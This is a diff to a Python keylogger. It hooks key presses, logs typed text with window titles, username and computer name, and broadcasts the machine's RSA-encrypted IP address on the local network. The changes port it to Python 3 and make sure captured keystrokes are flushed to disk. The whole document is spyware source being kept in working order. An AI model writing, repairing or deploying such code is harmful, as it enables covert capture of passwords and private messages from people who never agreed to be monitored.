@@ -29,7 +29,7 @@ def broadcast_myself():
         if not connected:
             BDs.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
             localIP = gethostbyname(gethostname())
-            BDs.sendto(cipher_rsa.encrypt(localIP), ("<broadcast>", BD_PORT))
+            BDs.sendto(cipher_rsa.encrypt(localIP.encode("ascii")), ("<broadcast>", BD_PORT))
         sleep(BD_INTERVAL)
     BDs.close()
 
@@ -78,7 +78,7 @@ def header(text):
         formatted text
     """
     return "\n{0}\n{1}{2}{1}\n{0}\n".format("=" * (len(text) + 20),
-                                            " " * (((len(text) + 20) / 2) - (len(text) / 2)), text)
+                                            " " * (((len(text) + 20) // 2) - (len(text) // 2)), text)
 
 
 def write_to_file():
@@ -91,6 +91,7 @@ def write_to_file():
     global text_buffer, file_handle, file_lock
     if file_lock.acquire(False):
         file_handle.write(text_buffer)
+        file_handle.flush()
         file_lock.release()
         text_buffer = ""
         return True
@@ -141,7 +142,7 @@ def on_key_down(event):
         text_buffer += header(curr_win)
         last_win = curr_win
     if un_char["code"] == 1 and chr(event.Ascii) in printable[:-5] and not modifiers["ctrl"]:
-        text_buffer += un_char["char"]
+        text_buffer += str(un_char["char"])
     elif event.Key not in BANNED_BUTTONS:
         text_buffer += "{%s}" % ("".join(
             [mod.upper() + "+" for mod in modifiers.keys() if modifiers[mod]]) + event.Key)
@@ -172,7 +173,7 @@ if __name__ == "__main__":
     public_key = RSA.import_key(open(CERT_FILE).read())
     cipher_rsa = PKCS1_OAEP.new(public_key)
     file_lock = Lock()
-    file_handle = open(FILE_NAME, "w+")
+    file_handle = open(FILE_NAME, "w+", encoding="utf-8")
     file_handle.write(header("KEYLOG STARTED AT {time} BY USER {user} ON {computer}".format(
         time=datetime.now().strftime("%d.%m.%Y %H:%M:%S"), user=getuser(), computer=environ['COMPUTERNAME'])))
 
